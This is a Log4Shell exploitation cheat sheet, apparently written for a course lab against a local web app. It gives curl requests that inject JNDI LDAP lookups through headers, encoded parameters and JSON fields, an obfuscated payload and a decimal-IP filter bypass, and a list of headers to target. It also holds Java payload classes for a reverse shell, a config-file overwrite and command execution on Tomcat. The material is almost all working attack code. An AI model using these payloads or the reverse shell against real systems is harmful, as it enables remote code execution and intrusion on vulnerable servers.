# Basic Exploit
```Bash
# Test java parameters
${sys:os.name}
${sys:user.name}
${log4j:configParentLocation}
${ENV:PATH}
${ENV:HOSTNAME}
${java:version}

# Exploiting a Header
curl http://localhost:8080/rest/wizards/isAlive -H 'GATECH_ID: 904160213' -H 'Content-type: application/json' -H 'Referer: EXPLOIT ${env:ADMIN_PASSWORD}'

# Exploiting a parameter (URL Encoded) https://meyerweb.com/eric/tools/dencoder/
curl 'http://localhost:8080/rest/wizards/wizard/07577db4-f9ce-47f5-9508-61987ca4e987?darkArts=%24%7B%24%7Benv%3AENV_NAME%3A-j%7Dndi%24%7Benv%3AENV_NAME%3A-%3A%7D%24%7Benv%3AENV_NAME%3A-l%7Ddap%3A%2F%2F172.17.0.1%3A1389%2FExploit%7D' -H 'GATECH_ID:904160213' -H 'Accept: application/json' | python3 -m json.tool

# Exploiting parameter and bypassing IP filter by converting to hex, then to base-10 https://www.terminally-incoherent.com/blog/2006/09/03/url-obfuscation/index.html
curl -X POST 'http://localhost:8080/rest/payments/payment' -H 'GATECH_ID: 904160213' -H 'Content-Type:application/json'  --data-raw '{
  "paymentId":"1",
  "amount":"100",
  "payer": {
    "id":"2",
    "firstName":"TEST",
    "lastName":"${jndi:ldap://3232235801:1389/Exploit}",
    "accountNumber":"321"
  },
  "payee": {
    "id":"1",
    "firstName":"test",
    "lastName":"test",
    "accountNumber":"123"
  },
  "paymentDateTime": "2025-03-06T06:00:00.923163"
}
'
```

# Vulnerable Headers
```Bash
User-Agent
Referer 
X-Api-Version
X-Forwarded-For
Authentication
Contact
From
X-Wap-Profile
X-Original-URL
X-Forwarded-Proto
X-Forwarded-Server
Profile
Proxy-Host
Destination
Proxy
Via
True-Client-IP
Client-IP
X-Client-IP
X-Real-IP
X-Originating-IP
CF-Connecting_IP
Forwarded 
```

# Java Exploits
```Java
### Getting a Shell ###
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {
    public Exploit() throws Exception {
        String host="192.168.1.25";        # Listen IP
        int port=9999;                     # Listen Port
        String[] cmd = {"/bin/sh"};        # Command to run
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s = new Socket(host, port);
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();

        while(!s.isClosed()) {
            while (pi.available() > 0) so.write(pi.read());
            while (pe.available() > 0) so.write(pe.read());
            while (si.available() > 0) po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            } catch (Exception e) {}
        };
        p.destroy();
        s.close();
    }
}
```
```Java
### Overwriting the config.properties file ###
import java.io.*;
import java.util.Properties;

public class Exploit {
    static {
        try {
            File file = new File("config.properties");
            Properties props = new Properties();
	    if (!file.exists()) {
		    System.out.println("config.properties could not be found");
	    }

	    try (FileInputStream fis = new FileInputStream(file)) {
	    	props.load(fis);
	    }

            props.setProperty("magicPower", "904160213");

	    try (FileOutputStream fos = new FileOutputStream(file)) {
		    props.store(fos, null);
	    }

	    try (BufferedReader br = new BufferedReader(new FileReader(file))) {
		    String line;
		    while ((line = br.readLine()) != null) {
			    System.out.println(line);
		    }
	    }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
```Java
import java.io.IOException;

public class Exploit {
    static {
        try {
            String[] cmd = {"/bin/sh", "-c", "echo 'TimeToBleed!' > /usr/local/tomcat/webapps/Ronnie.txt"};
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```
